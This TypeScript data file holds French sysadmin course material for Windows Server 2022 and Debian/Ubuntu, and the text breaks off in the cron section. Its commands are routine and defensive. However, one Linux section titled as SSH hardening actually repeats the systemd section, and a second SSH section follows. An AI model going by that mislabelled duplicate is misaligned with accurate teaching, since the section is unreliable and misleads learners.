export interface CourseSection {
  title: string;
  content: string;
  code?: { lang: string; code: string };
  tip?: string;
}

export interface CourseContent {
  slug: string;
  intro: string;
  sections: CourseSection[];
}

export const courseContents: Record<string, CourseContent> = {
  "administration-windows-server": {
    slug: "administration-windows-server",
    intro: "Windows Server 2022 est le système d'exploitation serveur de Microsoft. Il est au cœur de la quasi-totalité des infrastructures d'entreprise en France. Ce cours vous prépare à administrer un domaine Active Directory complet, gérer les politiques de groupe, configurer les services réseau DHCP et DNS.",
    sections: [
      {
        title: "1. Introduction à Windows Server 2022",
        content: `Windows Server 2022 est la dernière version LTS (Long Term Servicing) de Microsoft, sortie en 2021. Elle apporte des améliorations majeures en sécurité (Secured-core server), en connectivité (SMB over QUIC) et en conteneurs (intégration Kubernetes).\n\n**Éditions disponibles** :\n- **Standard** : pour les environnements physiques ou peu virtualisés (2 VM incluses)\n- **Datacenter** : VM illimitées, fonctionnalités avancées (Storage Spaces Direct, SDN)\n- **Essentials** : TPE/PME jusqu'à 25 utilisateurs\n\n**Rôles principaux** : AD DS, DNS, DHCP, File Server, IIS, Hyper-V, Remote Desktop Services, Certificate Authority.\n\n**Méthodes d'installation** :\n- **Desktop Experience** (GUI complète) : recommandée en apprentissage\n- **Server Core** (ligne de commande) : recommandée en production (surface d'attaque réduite, moins de mises à jour)`,
        code: {
          lang: "powershell",
          code: `# Vérifier la version et l'édition installée
Get-ComputerInfo | Select-Object WindowsProductName, OsVersion, CsProcessors

# Configurer le nom du serveur et l'IP statique
Rename-Computer -NewName "SRV-DC01" -Restart

# Configurer l'adresse IP statique (interface index 1)
New-NetIPAddress -InterfaceIndex 1 -IPAddress 192.168.1.10 -PrefixLength 24 -DefaultGateway 192.168.1.1
Set-DnsClientServerAddress -InterfaceIndex 1 -ServerAddresses 192.168.1.10

# Activer le Bureau à distance (RDP)
Set-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server" -Name fDenyTSConnections -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`,
        },
        tip: "Installez toujours Windows Server en Server Core en production. La surface d'attaque est réduite de 40% et les mises à jour sont moins fréquentes.",
      },
      {
        title: "2. Active Directory — Concepts et déploiement",
        content: `Active Directory (AD DS) est un service d'annuaire qui centralise l'authentification et l'autorisation dans un réseau Windows.\n\n**Domaine** : unité d'administration de base. Tous les objets (utilisateurs, ordinateurs, groupes) appartiennent à un domaine.\n\n**Unité d'organisation (OU)** : conteneur permettant de déléguer l'administration et d'appliquer des GPO de manière ciblée.\n\n**Forêt** : ensemble de domaines partageant le même schéma AD. C'est la frontière de sécurité absolue.\n\n**Catalogue global** : index de tous les objets de la forêt, indispensable pour les recherches multi-domaines et l'authentification Exchange.`,
        code: {
          lang: "powershell",
          code: `# Installer le rôle AD DS
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promouvoir le serveur en contrôleur de domaine
Install-ADDSForest \`
  -DomainName "entreprise.local" \`
  -DomainNetbiosName "ENTREPRISE" \`
  -ForestMode "WinThreshold" \`
  -DomainMode "WinThreshold" \`
  -InstallDns \`
  -Force`,
        },
        tip: "Déployez toujours minimum 2 contrôleurs de domaine. Un seul DC = point de défaillance unique qui bloque tout le réseau.",
      },
      {
        title: "3. Gestion des utilisateurs et groupes",
        content: `La gestion des comptes est le quotidien de l'administrateur AD. Comprendre les types de groupes et les étendues est fondamental.\n\n**Types de groupes** :\n- **Sécurité** : pour les autorisations d'accès aux ressources\n- **Distribution** : pour les listes de diffusion email (Exchange)\n\n**Étendues de groupes** :\n- **Local de domaine** : membres de n'importe quel domaine, ressources du domaine local\n- **Global** : membres du même domaine, ressources de toute la forêt\n- **Universel** : membres de toute la forêt, ressources de toute la forêt\n\n**Bonne pratique AGDLP** : Accounts → Global groups → Domain Local groups → Permissions`,
        code: {
          lang: "powershell",
          code: `# Créer un utilisateur
New-ADUser -Name "Jean Dupont" \`
  -GivenName "Jean" -Surname "Dupont" \`
  -SamAccountName "jdupont" \`
  -UserPrincipalName "jdupont@entreprise.local" \`
  -Path "OU=Comptabilité,DC=entreprise,DC=local" \`
  -AccountPassword (Read-Host -AsSecureString "Mot de passe") \`
  -Enabled $true

# Créer un groupe de sécurité global
New-ADGroup -Name "GRP-Comptabilite" \`
  -GroupScope Global -GroupCategory Security \`
  -Path "OU=Groupes,DC=entreprise,DC=local"

# Ajouter un utilisateur au groupe
Add-ADGroupMember -Identity "GRP-Comptabilite" -Members "jdupont"

# Lister tous les membres d'un groupe
Get-ADGroupMember -Identity "GRP-Comptabilite" | Select Name, SamAccountName`,
        },
      },
      {
        title: "4. Stratégies de groupe (GPO)",
        content: `Les GPO (Group Policy Objects) permettent d'appliquer des paramètres de configuration à des utilisateurs ou des ordinateurs de manière centralisée. L'ordre d'application est : **Local → Site → Domaine → OU** (mémorisez LSDOU).\n\n**Héritages et blocages** : une GPO enfant hérite des GPO parentes. Vous pouvez bloquer l'héritage sur une OU ou forcer l'application avec "Appliqué".\n\n**Filtrage de sécurité** : une GPO ne s'applique qu'aux objets ayant les permissions "Lecture" et "Appliquer la stratégie de groupe".`,
        code: {
          lang: "powershell",
          code: `# Créer une nouvelle GPO
New-GPO -Name "Politique-Securite-Postes"

# Lier la GPO à une OU
New-GPLink -Name "Politique-Securite-Postes" -Target "OU=Postes,DC=entreprise,DC=local"

# Forcer la mise à jour sur tous les postes
Invoke-GPUpdate -Computer "PC-Comptabilite" -Force -RandomDelayInMinutes 0

# Générer un rapport HTML de résultante des stratégies
Get-GPResultantSetOfPolicy -ReportType Html -Path "C:\\rapport-rsop.html"`,
        },
        tip: "Utilisez gpresult /H rapport.html pour diagnostiquer quelles GPO s'appliquent réellement à un utilisateur ou machine.",
      },
      {
        title: "5. Configuration DNS",
        content: `Dans un domaine AD, le DNS est critique. Il résout les noms d'hôtes en adresses IP et localise les services AD via les enregistrements SRV.\n\n**Types d'enregistrements essentiels** :\n- **A** : nom → IPv4\n- **AAAA** : nom → IPv6\n- **CNAME** : alias\n- **MX** : serveur de messagerie\n- **SRV** : localisation de services (LDAP, Kerberos)\n- **PTR** : résolution inverse\n\n**Zones DNS** :\n- **Principale** : zone de référence, modifiable\n- **Secondaire** : copie en lecture seule (transfert de zone)\n- **Stub** : contient uniquement les enregistrements NS\n- **Intégrée à l'AD** : réplication automatique entre tous les DC`,
        code: {
          lang: "powershell",
          code: `# Vérifier l'état du service DNS
Get-Service DNS | Select Status, StartType

# Ajouter un enregistrement A
Add-DnsServerResourceRecordA -Name "serveur-web" \`
  -ZoneName "entreprise.local" -IPv4Address "192.168.1.20"

# Ajouter un enregistrement CNAME (alias)
Add-DnsServerResourceRecordCName -Name "www" \`
  -ZoneName "entreprise.local" -HostNameAlias "serveur-web.entreprise.local"

# Tester la résolution DNS
Resolve-DnsName "serveur-web.entreprise.local"
nslookup -type=SRV _ldap._tcp.entreprise.local`,
        },
      },
      {
        title: "6. Configuration DHCP",
        content: `Le DHCP distribue automatiquement les paramètres réseau. Une mauvaise configuration DHCP bloque tous les postes du réseau — c'est un service critique.\n\n**Étendue (scope)** : plage d'adresses IP attribuables pour un sous-réseau.\n\n**Exclusions** : adresses réservées aux équipements à IP fixe (serveurs, imprimantes) à l'intérieur de la plage.\n\n**Réservations** : adresse IP fixe attribuée toujours au même équipement via son adresse MAC.\n\n**Options DHCP** par ordre de priorité : serveur, étendue, classe, client.`,
        code: {
          lang: "powershell",
          code: `# Installer DHCP
Install-WindowsFeature DHCP -IncludeManagementTools

# Autoriser le serveur DHCP dans l'AD
Add-DhcpServerInDC -DnsName "SRV-DC01.entreprise.local" -IPAddress 192.168.1.10

# Créer une étendue
Add-DhcpServerv4Scope -Name "LAN-Principal" \`
  -StartRange 192.168.1.100 -EndRange 192.168.1.200 \`
  -SubnetMask 255.255.255.0 -State Active

# Options de l'étendue (passerelle + DNS)
Set-DhcpServerv4OptionValue -ScopeId 192.168.1.0 \`
  -Router 192.168.1.1 -DnsServer 192.168.1.10

# Créer une exclusion (imprimante à IP fixe dans la plage)
Add-DhcpServerv4ExclusionRange -ScopeId 192.168.1.0 \`
  -StartRange 192.168.1.100 -EndRange 192.168.1.110`,
        },
        tip: "Configurez toujours le DHCP Failover entre 2 serveurs DHCP pour la haute disponibilité. Un seul serveur DHCP = coupure réseau garantie en cas de panne.",
      },
      {
        title: "7. Partages de fichiers et NTFS",
        content: `La gestion des accès aux fichiers repose sur deux niveaux de permissions combinés : **permissions de partage** (réseau) et **permissions NTFS** (système de fichiers). La permission effective est la plus restrictive des deux.\n\n**Permissions NTFS** (du moins au plus permissif) : Lecture, Lecture et exécution, Liste du contenu, Modification, Contrôle total.\n\n**Permissions de partage** : Lecture, Modification, Contrôle total.\n\n**Bonne pratique** : donner Contrôle total au niveau du partage et gérer finement les droits via NTFS uniquement.`,
        code: {
          lang: "powershell",
          code: `# Créer un dossier partagé
New-Item -Path "C:\\Partages\\Commun" -ItemType Directory
New-SmbShare -Name "Commun" -Path "C:\\Partages\\Commun" \`
  -FullAccess "Administrateurs" \`
  -ChangeAccess "GRP-Employes" \`
  -ReadAccess "Tout le monde"

# Modifier les permissions NTFS
$acl = Get-Acl "C:\\Partages\\Commun"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
  "GRP-Employes", "Modify", "ContainerInherit,ObjectInherit", "None", "Allow"
)
$acl.SetAccessRule($rule)
Set-Acl "C:\\Partages\\Commun" $acl

# Vérifier les partages actifs
Get-SmbShare | Where-Object {$_.Name -notlike "*$"}`,
        },
      },
      {
        title: "8. Surveillance et journaux d'événements",
        content: `L'Observateur d'événements Windows (Event Viewer) centralise tous les journaux système. En entreprise, ces journaux sont centralisés vers un SIEM.\n\n**Journaux essentiels** :\n- **Sécurité** : connexions, échecs d'auth, modifications de comptes → audit obligatoire\n- **Système** : erreurs matérielles et OS\n- **Application** : erreurs applicatives\n- **DNS Server / DFS / DHCP** : journaux des rôles\n\n**IDs d'événements clés** : 4624 (connexion réussie), 4625 (échec), 4720 (compte créé), 4740 (compte verrouillé), 7045 (nouveau service).`,
        code: {
          lang: "powershell",
          code: `# Consulter les 20 dernières erreurs système
Get-EventLog -LogName System -EntryType Error -Newest 20 | Select TimeGenerated, Source, Message

# Chercher les échecs de connexion (brute-force)
Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4625} | \`
  Select TimeCreated, @{n="Compte";e={$_.Properties[5].Value}}, \`
  @{n="IP Source";e={$_.Properties[19].Value}} | Select -First 20

# Exporter les logs de sécurité vers CSV
Get-WinEvent -LogName Security -MaxEvents 1000 | \`
  Export-Csv "C:\\Logs\\securite-$(Get-Date -f yyyyMMdd).csv" -NoTypeInformation

# Activer l'audit des connexions (via GPO ou commande)
auditpol /set /subcategory:"Logon" /success:enable /failure:enable`,
        },
      },
      {
        title: "9. Sauvegarde avec Windows Server Backup",
        content: `La sauvegarde est une obligation légale dans de nombreux secteurs et une nécessité absolue en production. Windows Server Backup (WSB) est l'outil natif de Microsoft.\n\n**Types de sauvegardes** :\n- **Complète** : tout le système, longue mais autonome\n- **Incrémentielle** : uniquement les changements depuis la dernière sauvegarde\n- **Différentielle** : changements depuis la dernière sauvegarde complète\n\n**Règle du 3-2-1** : 3 copies, 2 supports différents, 1 hors-site.\n\n**Sauvegarde AD** : utilisez la fonctionnalité "System State" pour sauvegarder AD DS. Une sauvegarde système seule ne suffit pas pour restaurer un DC.`,
        code: {
          lang: "powershell",
          code: `# Installer la fonctionnalité Windows Server Backup
Install-WindowsFeature Windows-Server-Backup

# Sauvegarde complète vers un disque externe (D:)
$policy = New-WBPolicy
$fileSpec = New-WBFileSpec -FileSpec "C:\\"
Add-WBFileSpec -Policy $policy -FileSpec $fileSpec
Set-WBVssBackupOption -Policy $policy -VssFull
$backupLocation = New-WBBackupTarget -VolumePath "D:\\"
Add-WBBackupTarget -Policy $policy -Target $backupLocation
Start-WBBackup -Policy $policy

# Vérifier l'historique des sauvegardes
Get-WBSummary

# Planifier une sauvegarde quotidienne à 2h du matin
Set-WBSchedule -Policy $policy -Schedule 02:00`,
        },
        tip: "Testez votre plan de restauration au moins une fois par trimestre dans un environnement isolé. Une sauvegarde non testée n'est pas une sauvegarde.",
      },
      {
        title: "10. Sécurisation du contrôleur de domaine",
        content: `Le contrôleur de domaine est la cible n°1 des attaquants dans un réseau Windows. Le compromettre = compromission totale de l'entreprise (Pass-the-Hash, Golden Ticket, DCSync).\n\n**Mesures de sécurisation** :\n1. **Tiering model** : comptes Admin de niveaux 0/1/2 séparés (ne jamais utiliser un compte admin du domaine pour surfer sur Internet)\n2. **Protected Users** : groupe AD qui désactive NTLM, Kerberos DES/RC4, mise en cache des credentials\n3. **Credential Guard** : isole les secrets LSASS dans une VM sécurisée\n4. **LAPS** : génère des mots de passe administrateurs locaux uniques et aléatoires\n5. **Fine-Grained Password Policy** : politiques de mots de passe différentes selon les OU`,
        code: {
          lang: "powershell",
          code: `# Activer Protected Users pour les comptes sensibles
Add-ADGroupMember -Identity "Protected Users" -Members "Administrateur","svc-backup"

# Installer et configurer LAPS (Local Admin Password Solution)
# Prérequis : LAPS installé sur les clients via GPO
Install-Module -Name LAPS -Force
Update-LapsADSchema
Set-LapsADComputerSelfPermission -Identity "OU=Postes,DC=entreprise,DC=local"

# Voir le mot de passe LAPS d'un poste
Get-LapsADPassword -Identity "PC-COMPTA01" -AsPlainText

# Vérifier les membres du groupe Admins du domaine (surveillance)
Get-ADGroupMember "Domain Admins" | Select Name, SamAccountName`,
        },
        tip: "Le compte Administrateur intégré (RID 500) ne peut pas être verrouillé par les politiques de mots de passe. Désactivez-le et créez un compte admin avec un nom différent.",
      },
      {
        title: "11. TP — Infrastructure complète",
        content: `**Objectif du TP** : déployer une infrastructure Windows Server 2022 complète et fonctionnelle.\n\n**Scénario** : vous êtes l'administrateur réseau de la société "TechFormation SAS" (50 utilisateurs répartis en 4 services : Direction, RH, Informatique, Commercial).\n\n**Étapes à réaliser** :\n1. Installer Windows Server 2022 en VM (8 Go RAM, 80 Go disque)\n2. Configurer l'IP statique et renommer le serveur SRV-DC01\n3. Installer et promouvoir en DC du domaine techformation.local\n4. Créer l'arborescence d'OU : Direction, RH, Informatique, Commercial, Postes, Groupes\n5. Créer 12 utilisateurs (3 par service) avec des mots de passe conformes\n6. Créer les groupes de sécurité globaux par service\n7. Configurer DHCP (plage 192.168.10.100-200) avec exclusion .100-.110\n8. Créer 3 GPO : fond d'écran unifié, désactivation des clés USB, mappage de lecteur réseau\n9. Créer un partage \\\\SRV-DC01\\Commun avec droits par groupe\n10. Tester avec un poste client Windows 10 joint au domaine`,
        tip: "Créez un snapshot de votre VM après chaque étape réussie. En cas d'erreur, vous pouvez revenir à l'état précédent sans tout recommencer.",
      },
      {
        title: "12. QCM de validation",
        content: `Testez vos connaissances sur l'ensemble du cours Windows Server 2022. Le QCM couvre tous les modules : AD DS, GPO, DNS, DHCP, partages, sécurité.\n\n**10 questions — durée estimée : 15 minutes**\n\nUn score de 70% minimum est requis pour valider le module et débloquer le badge TSSR-Windows.`,
      },
    ],
  },
  "linux-debian-admin": {
    slug: "linux-debian-admin",
    intro: "Linux Debian/Ubuntu Server est le système d'exploitation open-source incontournable pour les serveurs en entreprise. Ce cours vous forme à l'administration système complète : gestion des utilisateurs, services, sécurité SSH, firewall et automatisation par scripts Bash.",
    sections: [
      {
        title: "1. Installation Debian/Ubuntu Server",
        content: `Debian est une distribution GNU/Linux stable et fiable, base de nombreuses distributions (Ubuntu, Mint, Kali). Pour un serveur, choisissez toujours l'installation **minimale** sans interface graphique.\n\n**Partitionnement recommandé** :\n- /boot : 512 Mo (ext4)\n- / : 20 Go (ext4)\n- /var : 10 Go (ext4, pour les logs)\n- /home : reste (ext4)\n- swap : 2x RAM (jusqu'à 8 Go)\n\n**Après installation** : mettez à jour le système, configurez sudo, définissez une IP statique. Sur Ubuntu 20.04+, la configuration réseau passe par **Netplan** (/etc/netplan/*.yaml). Sur Debian, c'est /etc/network/interfaces.`,
        code: {
          lang: "bash",
          code: `# Mise à jour du système
apt update && apt upgrade -y

# Installer sudo et ajouter l'utilisateur au groupe sudo
apt install sudo -y
usermod -aG sudo votre_utilisateur

# IP statique sur Ubuntu (Netplan)
cat > /etc/netplan/01-netcfg.yaml << 'EOF'
network:
  version: 2
  ethernets:
    ens33:
      addresses: [192.168.1.20/24]
      routes:
        - to: default
          via: 192.168.1.1
      nameservers:
        addresses: [8.8.8.8, 1.1.1.1]
EOF
netplan apply

# Vérification
ip addr show ens33
ip route show`,
        },
        tip: "Installez toujours 'openssh-server' pour administrer le serveur à distance. Notez l'adresse IP lors de l'installation — vous en aurez besoin immédiatement.",
      },
      {
        title: "2. Système de fichiers et permissions",
        content: `Linux repose sur une architecture en couches : **noyau (kernel)**, bibliothèques système, shell, applications.\n\n**Hiérarchie du système de fichiers (FHS)** :\n- **/etc** : fichiers de configuration\n- **/var** : données variables (logs, bases de données)\n- **/home** : répertoires utilisateurs\n- **/usr** : programmes et bibliothèques\n- **/tmp** : fichiers temporaires\n- **/proc** : pseudo-filesystem (état du noyau en temps réel)\n- **/sys** : interface avec le matériel\n\n**Permissions** : chaque fichier a un propriétaire (user), un groupe (group) et des droits pour les autres (others). Format octal : 755 = rwxr-xr-x.`,
        code: {
          lang: "bash",
          code: `# Afficher les permissions détaillées
ls -la /etc/passwd

# Modifier les permissions (chmod)
chmod 750 /opt/script.sh        # rwxr-x---
chmod u+x,g-w fichier.sh        # notation symbolique

# Changer propriétaire et groupe
chown www-data:www-data /var/www/html

# Commandes essentielles de navigation
pwd && ls -lah && find /etc -name "*.conf" -type f 2>/dev/null | head -20`,
        },
        tip: "Mémorisez : 4=lecture, 2=écriture, 1=exécution. 7=tout, 5=lecture+exécution, 4=lecture seule. Ex: 644 = rw-r--r-- (fichier config standard).",
      },
      {
        title: "3. Gestion des utilisateurs et groupes",
        content: `Linux est multi-utilisateur. Chaque processus s'exécute sous l'identité d'un utilisateur avec ses droits propres. La gestion fine des comptes est un pilier de la sécurité système.\n\n**Fichiers système importants** :\n- **/etc/passwd** : liste des comptes (login, UID, GID, home, shell)\n- **/etc/shadow** : mots de passe hachés (root uniquement)\n- **/etc/group** : définition des groupes\n- **/etc/sudoers** : droits d'élévation sudo (éditez avec visudo !)\n\n**Types de comptes** : root (UID 0), comptes système (UID 1-999), comptes utilisateurs (UID ≥1000).`,
        code: {
          lang: "bash",
          code: `# Créer un utilisateur avec son home
useradd -m -s /bin/bash -c "Jean Dupont" jdupont
passwd jdupont                        # définir le mot de passe

# Créer un groupe et ajouter l'utilisateur
groupadd developpeurs
usermod -aG developpeurs jdupont      # -a = append (ne supprime pas les groupes existants)
groups jdupont                        # vérifier les groupes

# Compte de service (sans shell, sans home)
useradd -r -s /usr/sbin/nologin -c "Service nginx" www-data

# Sudo — édition sécurisée (JAMAIS nano /etc/sudoers directement)
visudo
# Ajouter la ligne : jdupont ALL=(ALL:ALL) NOPASSWD: /usr/bin/apt, /bin/systemctl

# Verrouiller / déverrouiller un compte
usermod -L jdupont                    # lock
usermod -U jdupont                    # unlock`,
        },
        tip: "Utilisez toujours 'visudo' pour éditer /etc/sudoers. Une erreur de syntaxe dans ce fichier peut rendre sudo inutilisable et vous couper de l'accès root.",
      },
      {
        title: "4. Gestion des paquets (apt)",
        content: `APT (Advanced Package Tool) est le gestionnaire de paquets de Debian/Ubuntu. Il gère les dépendances automatiquement et synchronise avec des dépôts officiels signés cryptographiquement.\n\n**Fichiers de configuration** :\n- **/etc/apt/sources.list** : dépôts principaux\n- **/etc/apt/sources.list.d/*.list** : dépôts supplémentaires\n\n**Cycle de maintenance** :\n1. apt update : synchronise la liste des paquets disponibles\n2. apt upgrade : met à jour les paquets installés (sans supprimer)\n3. apt full-upgrade : mise à jour complète (peut supprimer des paquets)\n4. apt autoremove : supprime les dépendances orphelines`,
        code: {
          lang: "bash",
          code: `# Opérations courantes
apt update                            # synchroniser les sources
apt upgrade -y                        # mettre à jour
apt install nginx curl wget -y        # installer des paquets
apt remove nginx                      # supprimer (conserve les configs)
apt purge nginx                       # supprimer + configs
apt autoremove -y                     # nettoyer les dépendances inutiles
apt search nginx                      # chercher un paquet
apt show nginx                        # détails d'un paquet

# Ajouter un dépôt externe (exemple : Docker)
apt install ca-certificates curl gnupg -y
install -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | \
  gpg --dearmor -o /etc/apt/keyrings/docker.gpg
echo "deb [signed-by=/etc/apt/keyrings/docker.gpg] \
  https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" \
  > /etc/apt/sources.list.d/docker.list
apt update && apt install docker-ce -y`,
        },
        tip: "Planifiez les mises à jour avec 'unattended-upgrades' pour les correctifs de sécurité automatiques. En production, testez toujours en pré-prod avant de mettre à jour les serveurs critiques.",
      },
      {
        title: "5. Services systemd",
        content: `**systemd** est le système d'initialisation standard depuis Debian 8 / Ubuntu 15.04. Il remplace SysV init et gère le démarrage, les services, les logs (journald) et les montages.\n\nUn **unit systemd** est décrit par un fichier .service dans /etc/systemd/system/. Il définit comment démarrer, arrêter et surveiller un service.\n\n**Types d'unités** : .service, .socket (activation à la demande), .timer (remplace cron), .target (groupement), .mount (points de montage).`,
        code: {
          lang: "bash",
          code: `# Gestion des services (nginx en exemple)
systemctl start nginx       # démarrer
systemctl stop nginx        # arrêter
systemctl restart nginx     # redémarrer
systemctl reload nginx      # recharger config sans coupure
systemctl enable nginx      # activer au démarrage
systemctl disable nginx     # désactiver au démarrage
systemctl status nginx      # état détaillé + derniers logs
journalctl -u nginx -f      # suivre les logs en temps réel

# Créer un service personnalisé
cat > /etc/systemd/system/mon-app.service << 'EOF'
[Unit]
Description=Mon Application Web
After=network.target postgresql.service

[Service]
Type=simple
User=www-data
WorkingDirectory=/opt/mon-app
ExecStart=/usr/bin/node server.js
Restart=on-failure
RestartSec=5
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable --now mon-app`,
        },
      },
      {
        title: "6. Sécurisation SSH",
        content: `**systemd** est le système d'initialisation standard depuis Debian 8 / Ubuntu 15.04. Il remplace SysV init et gère le démarrage, les services, les logs (journald) et les montages.\n\nUn **unit systemd** est décrit par un fichier .service dans /etc/systemd/system/. Il définit comment démarrer, arrêter et surveiller un service.\n\n**Types d'unités** : service, socket, timer, target, mount, path...`,
        code: {
          lang: "bash",
          code: `# Gestion des services (nginx en exemple)
systemctl start nginx       # démarrer
systemctl stop nginx        # arrêter
systemctl restart nginx     # redémarrer
systemctl reload nginx      # recharger config sans coupure
systemctl enable nginx      # activer au démarrage
systemctl status nginx      # état détaillé

# Créer un service personnalisé
cat > /etc/systemd/system/mon-app.service << 'EOF'
[Unit]
Description=Mon Application Web
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/opt/mon-app
ExecStart=/usr/bin/node server.js
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload && systemctl enable --now mon-app`,
        },
      },
      {
        title: "6. Sécurisation SSH",
        content: `SSH (Secure Shell) est le protocole standard pour administrer les serveurs Linux à distance. Par défaut, il écoute sur le port 22 et accepte l'authentification par mot de passe — deux failles majeures à corriger en production.\n\n**Bonnes pratiques obligatoires** :\n1. Authentification par clé uniquement (désactiver les mots de passe)\n2. Désactiver la connexion root directe\n3. Changer le port par défaut (obscurcissement)\n4. Limiter les utilisateurs autorisés\n5. Configurer fail2ban contre le brute-force`,
        code: {
          lang: "bash",
          code: `# Générer une paire de clés SSH (sur votre poste client)
ssh-keygen -t ed25519 -C "admin@entreprise.fr" -f ~/.ssh/id_ed25519

# Copier la clé publique sur le serveur
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@192.168.1.50

# Sécuriser /etc/ssh/sshd_config
sudo nano /etc/ssh/sshd_config
# Modifier ces lignes :
# Port 2222
# PermitRootLogin no
# PasswordAuthentication no
# AllowUsers adminprod deployer
# MaxAuthTries 3

# Installer et configurer fail2ban
apt install fail2ban -y
systemctl enable --now fail2ban
fail2ban-client status sshd`,
        },
        tip: "Testez toujours la nouvelle configuration SSH dans un second terminal AVANT de fermer votre session actuelle. Une erreur dans sshd_config peut vous couper du serveur.",
      },
      {
        title: "7. Firewall UFW / iptables",
        content: `**UFW** (Uncomplicated Firewall) est l'interface simplifiée pour iptables sur Debian/Ubuntu. Il permet de gérer les règles de filtrage réseau sans maîtriser la syntaxe complexe d'iptables.\n\n**Politique par défaut recommandée** : bloquer tout le trafic entrant, autoriser tout le trafic sortant, puis ouvrir uniquement les ports nécessaires (principe du moindre privilège).\n\n**iptables** reste l'outil de bas niveau. Les règles iptables sont organisées en tables (filter, nat, mangle) et en chaînes (INPUT, OUTPUT, FORWARD).`,
        code: {
          lang: "bash",
          code: `# UFW — Configuration de base
ufw default deny incoming       # bloquer tout par défaut
ufw default allow outgoing      # autoriser les sorties
ufw allow ssh                   # SSH (port 22)
ufw allow 2222/tcp              # SSH sur port custom
ufw allow http                  # port 80
ufw allow https                 # port 443
ufw allow from 192.168.1.0/24   # autoriser tout un sous-réseau
ufw enable                      # activer le firewall
ufw status verbose              # voir les règles actives
ufw delete allow http           # supprimer une règle

# iptables — exemples équivalents
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -P INPUT DROP           # politique par défaut = DROP
iptables-save > /etc/iptables/rules.v4  # persister les règles`,
        },
        tip: "Avant d'activer UFW sur un serveur distant, vérifiez que la règle SSH est bien ajoutée. Sinon vous perdez l'accès au serveur et devrez passer par la console hôte.",
      },
      {
        title: "8. Scripts Bash — Bases",
        content: `Bash est le shell par défaut sur la majorité des distributions Linux. L'automatisation via scripts est une compétence clé de l'administrateur système.\n\n**Structure d'un script** : shebang (#!/bin/bash), variables, conditions (if/elif/else), boucles (for/while), fonctions, codes de retour ($?).\n\n**Bonnes pratiques** : toujours commencer par set -euo pipefail, utiliser des fonctions pour le log, tester avec des cas limites.`,
        code: {
          lang: "bash",
          code: `#!/bin/bash
set -euo pipefail

# Variables
PRENOM="Dojo"
COMPTEUR=0
FRUITS=("pomme" "banane" "cerise")

# Condition
if [[ $EUID -eq 0 ]]; then
    echo "Exécuté en root"
else
    echo "Exécuté en tant qu'utilisateur"
fi

# Boucle for sur un tableau
for fruit in "\${FRUITS[@]}"; do
    echo "Fruit : $fruit"
done

# Boucle while
while [[ $COMPTEUR -lt 5 ]]; do
    echo "Compteur : $COMPTEUR"
    ((COMPTEUR++))
done

# Fonction
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"
}

# Vérification code de retour
ping -c 1 -W 1 8.8.8.8 &>/dev/null && log "Réseau OK" || log "Pas de réseau"`,
        },
        tip: "Testez vos scripts avec 'bash -n script.sh' (vérification syntaxe) et 'bash -x script.sh' (mode trace — affiche chaque commande exécutée).",
      },
      {
        title: "9. Scripts Bash — Avancé",
        content: `Un administrateur système doit maîtriser les scripts Bash avancés pour automatiser les tâches répétitives et complexes : traitement de fichiers, interactions avec des APIs, rapports automatiques.\n\n**Outils indispensables** :\n- **awk** : traitement de colonnes et calculs sur des fichiers texte\n- **sed** : substitution de texte en flux\n- **grep** : recherche avec expressions régulières\n- **xargs** : passer des résultats en arguments\n- **find** : recherche de fichiers avec actions`,
        code: {
          lang: "bash",
          code: `#!/bin/bash
# Script de sauvegarde automatique avec rotation
set -euo pipefail

BACKUP_DIR="/var/backups"
SOURCE_DIR="/var/www"
RETENTION_DAYS=30
DATE=$(date +%Y-%m-%d_%H%M)

log() { echo "[$(date '+%H:%M:%S')] $*" | tee -a /var/log/backup.log; }

# Vérifier l'espace disque disponible (min 1 Go)
ESPACE=$(df "$BACKUP_DIR" | awk 'NR==2{print $4}')
if [[ $ESPACE -lt 1048576 ]]; then
    log "ERREUR : Espace insuffisant sur $BACKUP_DIR"
    exit 1
fi

log "Démarrage sauvegarde $DATE..."
mkdir -p "$BACKUP_DIR/$DATE"

# Archiver avec exclusions
tar -czf "$BACKUP_DIR/$DATE/www.tar.gz" \
    --exclude="$SOURCE_DIR/*/cache" \
    --exclude="$SOURCE_DIR/*/tmp" \
    "$SOURCE_DIR"

TAILLE=$(du -sh "$BACKUP_DIR/$DATE/www.tar.gz" | cut -f1)
log "Archive créée : $TAILLE"

# Supprimer les anciennes sauvegardes
find "$BACKUP_DIR" -maxdepth 1 -type d -mtime +$RETENTION_DAYS -exec rm -rf {} + 2>/dev/null || true
log "Rotation terminée (rétention : $RETENTION_DAYS jours)"`,
        },
      },
      {
        title: "10. Cron et automatisation",
        content: `**Cron** est le planificateur de tâches Unix. Il permet d'exécuter des commandes ou scripts à des intervalles définis (toutes les heures, tous les jours, toutes les semaines...).\n\n**Format crontab** : \`minute heure jour_du_mois mois jour_semaine commande\`\n\nValeurs spéciales : \`*\` = tout, \`*/5\` = toutes les 5 unités, \`1,15\` = le 1er et le 15.\n\n**systemd timers** remplacent avantageusement cron sur les systèmes modernes : meilleure gestion des erreurs, journalisation intégrée, activation conditionnelle.`,
        code: {
          lang: "bash",
          code: `# Éditer la crontab de l'utilisateur courant
crontab -e

# Exemples de planifications
# ┌─ minute (0-59)
# │ ┌─ heure (0-23)
# │ │ ┌─ jour du mois (1-31)
# │ │ │ ┌─ mois (1-12)
# │ │ │ │ ┌─ jour semaine (0=dim, 7=dim)
# │ │ │ │ │
  0 2 * * * /opt/scripts/backup.sh >> /var/log/backup.log 2>&1
  */5 * * * * /opt/scripts/check-services.sh
  0 8 * * 1 /opt/scripts/rapport-hebdo.sh
